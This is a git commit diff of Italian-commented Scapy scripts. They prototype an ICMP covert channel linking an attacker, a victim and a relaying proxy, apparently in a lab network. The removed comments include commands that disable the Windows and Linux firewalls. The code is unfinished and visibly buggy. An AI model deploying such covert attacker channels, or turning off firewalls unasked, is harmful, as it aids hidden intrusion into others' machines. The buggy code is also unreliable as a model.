33aa9323e529643dfa43ab8c36943d2348459367
Marco Mecarelli <61580913+mcrmrc@users.noreply.github.com>
2026-07-15 21:11:50 +0200

    Aggiornamento sugli Script

--- implementazione/unione/proxy.py
+++ implementazione/unione/proxy.py
@@ -1,65 +1,153 @@
-#https://thepythoncode.com/article/sniff-http-packets-scapy-python
-#https://www.geeksforgeeks.org/packet-sniffing-using-scapy/
-#https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/sniffing/index.html
-#
-#
-
 from scapy.all import *
-import string 
+import threading 
+import argparse 
+import mymethods
 
-redirectIP="192.168.56.102"
-def packet_callback(packet):
-    if packet.haslayer(ICMP) and packet.haslayer(IP): 
-        print("Packet captured:")
-        packet.show()
-        
-        newpacket=IP(id=packet[IP].id, dst=redirectIP)/ICMP(
-            id=packet[ICMP].id, seq=packet[ICMP].seq) / packet[Raw].load
-        #newpacket=packet[IP]/ packet[ICMP] / packet[Raw].load
-        #newpacket[IP].dst=redirectIP
-        print("New packet:")
-        newpacket.show()
-        ans = sr1(newpacket, iface="Ethernet 2", timeout=2, verbose=1) 
-        if ans:
-            print(f"{newpacket[IP].dst} is alive")
-            ans.show()
+parser = argparse.ArgumentParser()
+parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
+#parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
+
+event = threading.Event()
+ip_attaccante=None
+ip_vittima=None
+id_redirect=None
+
+def callback_redirect(packet):
+    if packet[IP].src is not ip_attaccante:
+        print(f"Il pacchetto non è stato mandato dall'attaccante ma da {packet[IP].src}")
+        return
+    print(f"Reindirizzamento del pacchetto {packet}") 
+    payload=""
+    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
+        payload = bytes(packet[Raw].load)
+    print(payload) 
+    if "__END__" in payload:
+        payload=payload.replace("__END__","").strip()
+        if payload=="":
+            print("Fine connessione")
+            event.set()
+            return 
+    if not packet[ICMP].id==mymethods.calculate(payload):
+        print("Il payload non combacia con il checksum")
+        print(packet.summary())
+        return
+    pkt = IP(dst=ip_attaccante)/ICMP(id=packet[ICMP].id, seq=packet[ICMP].seq) / payload
+    ans = sr1(pkt, timeout=2, verbose=1)
+    if ans:
+        print(f"{ip_attaccante} is alive")
+        #ans.show() 
+    else:
+        print(f"No reply: {ip_attaccante} is not responding") 
+
+def parte_redirect_packet():
+    sniffer= AsyncSniffer(
+        filter=f"icmp and src host {ip_attaccante}" 
+        #,count=1 
+        ,prn=callback_redirect 
+        # #,store=True 
+        # #,iface=args.host_iface 
+    ) 
+    sniffer.start()
+    event.wait()
+    sniffer.join()
+    sniffer.stop()
+
+def callback_vittima(packet):
+    print("Packet received: {}".format(packet.summary()))
+    global ip_vittima
+    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
+        payload = mymethods.calculate(bytes(packet[Raw].load))
+        check_sum=mymethods.calculate(b"__CONNECT__ ")
+        if check_sum==payload and ip_vittima==packet[IP].src and packet[ICMP].id==check_sum:
+            print("Payload: {}".format(payload)) 
+            print("Vittima IPs: {}".format(ip_vittima))
+            event.set()
         else:
-            print(f"{newpacket[IP].dst} is not responding")
-            print("No reply")
+            print(f"Il paccheto proviene da {packet[IP].src} ma non è valido")
+            raise Exception(f"Il paccheto proviene da {packet[IP].src} ma non è valido")    
 
+def parte_vittima(): 
+    payload=mymethods.calculate(b"__CONNECT__ ")
+    pkt = IP(dst=ip_vittima)/ICMP(id=mymethods.calculate(b"__CONNECT__ ")) / payload
+    ans = sr1(pkt, timeout=2, verbose=1)
+    if ans:
+        print(f"{ip_vittima} is alive")
+        #ans.show() 
+    else:
+        print(f"No reply: {ip_vittima} is not responding") 
+        raise Exception("La vittima non risponde")
+    sniffer= AsyncSniffer(
+        filter=f"icmp and src host {ip_vittima}" 
+        #,count=1 
+        ,prn=callback_vittima 
+        #,store=True 
+        #,iface=args.host_iface 
+    ) 
+    sniffer.start()
+    event.wait()
+    sniffer.join()
+    sniffer.stop()
 
-#iface: Specify the network interface to sniff on.
-#count: The number of packets to capture. If omitted, sniffing will continue until stopped.
-#filter: Apply a BPF (Berkeley Packet Filter) to capture only certain packets.
-#prn: Define a callback function to execute with each captured packet.
-#store: Whether to store sniffed packets or discard them.
-try:
-    packets = sniff(
-        iface="Ethernet 2", 
-        filter="icmp and src host 192.168.56.101",
-        timeout=15,
-        prn=packet_callback
-    )
-    #packets.summary()
-except KeyboardInterrupt:
-    print("Sniffing stopped by user.") 
-print("Sniffing finished.") 
+def callback_attaccante(packet):
+    print("Packet received: {}".format(packet.summary()))
+    global ip_vittima
+    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
+        payload = bytes(packet[Raw].load)
+        if b'__CONNECT__' in payload and ip_attaccante==packet[IP].src:
+            print("Found __CONNECT__")
+            ip_vittima= payload.decode().replace('__CONNECT__',"").strip()
+            print("Attacker IP: {}".format(ip_attaccante))
+            #print("Payload: {}".format(payload)) 
+            print("Vittima IPs: {}".format(ip_vittima))
+            event.set()
+        else:
+            print(f"Il paccheto proviene da {packet[IP].src} ma non richiede la connessione alla macchina")
 
+def connessione_attaccante():
+    print(f"Controllo connessione con l'attaccante: {ip_attaccante}")
+    sniffer= AsyncSniffer(
+            filter=f"icmp and src {ip_attaccante}" 
+            #,count=1 
+            ,prn=callback_attaccante 
+            #,store=True 
+            ,iface=args.host_iface 
+    ) 
+    sniffer.start()
+    print("AAA")
+    event.wait()
+    sniffer.join()
+    sniffer.stop()
+    pkt = IP(dst=ip_attaccante)/ICMP() / mymethods.calculate(b"__CONNECT__ ")
+    ans = sr1(pkt, timeout=2, verbose=1)
+    if ans:
+        print(f"{ip_attaccante} is alive")
+        #ans.show()
+    else:
+        print(f"No reply: {ip_attaccante} is not responding")
+        raise Exception("Nessuna risposta dall'attaccante") 
 
-
-#Scapy can also store sniffed packets in a .pcap file, which can be analyzed later with tools like Wireshark. To save packets to a file, use the wrpcap() function:
-#   Save captured packets to a file
-#   wrpcap('captured.pcap', packets)
-
-#Scapy can read packets from a .pcap file using the rdpcap() function or by setting the offline parameter in the sniff() function:
-#   Read packets from a file
-#   packets = rdpcap('captured.pcap')
-
-
-#Try disabling the firewall temporarily on the VM to test:
-#   On Windows: 
-#   netsh advfirewall set allprofiles state off
-#On Linux: 
-#   sudo ufw disable (if ufw is used)
-
-
+if __name__ == "__main__": 
+    print("Main function") 
+    args=mymethods.check_args(parser) 
+    if args.ip_attaccante is None :
+        print("Devi specificare l'IP dell'attaccante")
+        mymethods.supported_arguments(parser)
+        exit(0) 
+    global sniffer
+    ip_attaccante=args.ip_attaccante 
+    try:
+        connessione_attaccante()
+        exit(0)
+    except Exception as e:
+        print(f"Eccezione: {e}")
+        exit(1)
+    try:
+        parte_vittima()
+    except Exception as e:
+        print(f"Eccezzione: {f}")
+    try:
+        parte_redirect_packet() 
+        #thread = threading.Thread(target=sniff_4_start)
+        #thread.start() 
+    except Exception as e:
+        print(f"Eccezzione: {f}")
--- implementazione/unione/victim.py
+++ implementazione/unione/victim.py
@@ -1,57 +1,120 @@
 from scapy.all import *
 import threading 
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--host_ip',type=str, help="L'IP dell host dove ricevere i pacchetti ICMP")
+parser.add_argument('--host_iface',type=str, help="Intefaccia di rete dove l'host riceverà i pacchetti ICMP")
+#parser.add_argument('--provaFlag',type=int, help="Comando da eseguire")
 
 event = threading.Event()
 sniffed_data=None 
+host_ip=None
+host_iface=None
+proxy_ip=None
+ip_attacker=None
+
+def conn_attaccante():
+    event.wait()  
+    sniffer.stop()
+    print(f"Si stabilisce una connessione con {ip_attacker}")
+    pkt = IP(dst=ip_attacker)/ICMP() / "".join( "__CONNECT__ " )
+    ans = sr1(pkt, timeout=2, verbose=1)
+    if ans:
+        print(f"{ip_attacker} is alive")
+        #ans.show()
+        print("Proxy IPs: {}".format(proxy_ip))
+    else:
+        print(f"No reply: {ip_attacker} is not responding") 
 
 def send_data():
-    print("Data sent after sniffing started.")
+    print("Waiting to start the connection...")
     event.wait()  
-    print("__CONNECT_ received...\nSending data...")
-    
+    sniffer.stop()
+    print("__CONNECT_ received. Sending data...") 
+    command=input("Inserisci il comando. Inserisci 'exit' o 'quit' per terminare\n>>>\t")
+    while command not in ["exit","quit"]: 
+        print(command)
+        command=input(">>>\t")
+    exit(0)
 
 def packet_callback(packet):
     print("Packet received: {}".format(packet.summary()))
+    global ip_attacker, proxy_ip
     if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
         payload = bytes(packet[Raw].load)
         if b'__CONNECT__' in payload:
-            print("Found __CONNECT__ in ICMP packet payload.")
+            print("Found __CONNECT__")
             ip_attacker= packet[IP].src
             proxy_ip= payload.decode().replace('__CONNECT__',"").strip().split(",")
-            print("Attacker IP: {}".format(ip_attacker))
-            print("Payload: {}".format(payload)) 
-            print("Proxy IPs: {}".format(proxy_ip))
-            #event.set()
+            #print("Attacker IP: {}".format(ip_attacker))
+            #print("Payload: {}".format(payload)) 
+            #print("Proxy IPs: {}".format(proxy_ip))
+            event.set()
+
+def print_supportedArguments():
+    print("Controlla di inserire due volte - per gli argomenti")
+    print("Argomenti supportati:") 
+    for action in parser._actions:
+        print("\t{arg}: {help}".format(
+            arg=action.option_strings[0],
+            help=action.help
+        ))
+
+def check_args():
+    try:
+        args, unknown = parser.parse_known_args() 
+        print("Argomenti passati: {}".format(args))
+        if len(unknown) > 0:
+            print("Argomenti sconosciuti: {}".format(unknown))
+            print_supportedArguments()
+            exit(1) 
+        return args
+    except Exception as e:
+        print("Errore: {}".format(e)) 
+        exit(1)
+
+if __name__=="__main__":
+    print("Main function") 
+    args=check_args()
+    if args.host_ip is None or args.host_iface is None:
+        print("Devi specificare l'IP e l'interfaccia di rete dell host")
+        print_supportedArguments()
+        exit(0) 
+    global sniffer
+    try:
+        sniffer= AsyncSniffer(
+            filter=f"icmp and dst host {args.host_ip}" 
+            #,count=1 
+            ,prn=packet_callback 
+            #,store=True 
+            ,iface=args.host_iface 
+        ) 
+        sniffer.start()
+    except Exception as e:
+        print("an Exception has occured: {e}") 
+        exit(1) 
+    #thread = threading.Thread(target=sniff_4_start)
+    #thread.start() 
+    conn_attaccante()
+
 
 def sniff_4_start():
     print("Sniffing for __CONNECT__ in the ICMP packets...")
     try:
         sniffed_packets = sniff( 
-            filter="icmp and dst host" #and icmp.type == 8 and icmp.payload.__contains__(b'__CONNECT__') 
+            filter="icmp and dst host {}".format(host_ip) 
             #,count=1
-            ,prn=packet_callback
-            #,prn=lambda x: True 
-            #    if x.haslayer(IP) and x.haslayer(ICMP) and x.haslayer(RAW) and b'__CONNECT__' in bytes(x[ICMP].payload) 
-            #    else None #b'__CONNECT__' in x.load else False
-            ,store=True
-            ,iface="Ethernet 2" 
+            ,prn=packet_callback 
+            #,store=True
+            ,iface="{}".format(host_iface) 
         )
         sniffed_packets.summary()
         if sniffed_packets is None:
             print("No packets sniffed.")
             raise Exception("No packets sniffed.")
         event.set()
+        sniffer.stop()
     except KeyboardInterrupt:
         print("Sniffing stopped by user.") 
-        exit(0)
-        #raise SystemExit(0) 
-
-if __name__=="__main__":
-    print("Main function")
-    #thread = threading.Thread(target=sniff_4_start)
-    #thread.start()
-    sniff_4_start()
-    print("Sniffing started...")
-    exit(0)
-    send_data()
-    
+        exit(1) 
